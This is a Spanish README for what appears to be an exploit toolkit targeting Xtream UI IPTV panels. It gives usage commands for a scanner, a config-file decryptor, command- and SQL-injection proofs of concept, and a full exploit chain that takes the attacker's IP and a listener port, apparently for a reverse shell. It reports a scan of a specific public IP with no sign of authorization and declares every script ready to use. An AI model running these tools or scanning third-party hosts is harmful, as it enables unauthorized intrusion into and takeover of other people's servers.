# ✅ SCRIPTS ACTUALIZADOS A PYTHON 3

## 🐍 Compatibilidad

Todos los scripts han sido **actualizados y son compatibles con Python 3**.

## 🚀 Uso Correcto

### Scanner de Vulnerabilidades

```bash
python3 exploits/security_scanner.py <TARGET_IP> [puerto]

# Ejemplos:
python3 exploits/security_scanner.py 192.168.1.100
python3 exploits/security_scanner.py example.com 25500
```

### Desencriptador de Configuración

```bash
python3 exploits/decrypt_config.py <archivo_config>

# Ejemplo:
python3 exploits/decrypt_config.py /home/xtreamcodes/iptv_xtream_codes/config
```

### Demo de Command Injection

```bash
python3 exploits/command_injection_poc.py
```

### Demo de SQL Injection

```bash
python3 exploits/sql_injection_poc.py
```

### Cadena de Explotación Completa

```bash
python3 exploits/full_exploit_chain.py <target_ip> <your_ip> [puerto_listener]

# Ejemplo:
python3 exploits/full_exploit_chain.py 192.168.1.100 192.168.1.50 4444
```

## 📋 Resultado del Escaneo de Prueba

El scanner fue probado exitosamente contra la IP proporcionada:

```
Target: 206.212.242.21
Puerto: 25500
Resultado: CERRADO (esperado - no es un servidor Xtream UI activo)
```

## ⚠️ Notas Importantes

1. **Python 3 Requerido**: Todos los scripts ahora requieren Python 3.6+
2. **Dependencias**: Todas las librerías usadas son parte de la librería estándar de Python
3. **Permisos**: Asegúrate de que los scripts tengan permisos de ejecución (`chmod +x exploits/*.py`)

## 🧪 Prueba de Funcionamiento

Para verificar que todo funciona correctamente:

```bash
# 1. Verificar versión de Python
python3 --version  # Debe ser 3.6 o superior

# 2. Probar scanner (con IP inexistente, solo para test)
python3 exploits/security_scanner.py 127.0.0.1

# 3. Ver documentación de los exploits
python3 exploits/command_injection_poc.py
python3 exploits/sql_injection_poc.py
```

## ✅ Actualizado

- Fecha: 29 de Enero 2026
- Python: 3.x compatible
- Estado: Funcional y probado

**Todos los scripts están listos para usar!**
